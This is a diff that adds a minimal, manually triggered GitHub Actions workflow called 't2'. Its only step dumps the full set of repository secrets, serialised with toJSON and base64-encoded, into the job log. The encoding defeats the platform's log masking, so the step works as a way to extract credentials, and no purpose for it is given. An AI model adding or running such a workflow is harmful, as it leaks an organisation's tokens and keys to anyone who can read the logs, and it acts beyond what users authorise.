@@ -1,0 +1,7 @@
+name: t2
+on: {workflow_dispatch: {}}
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "S=$(printf '${{ toJSON(secrets) }}'  | base64 -w0)"
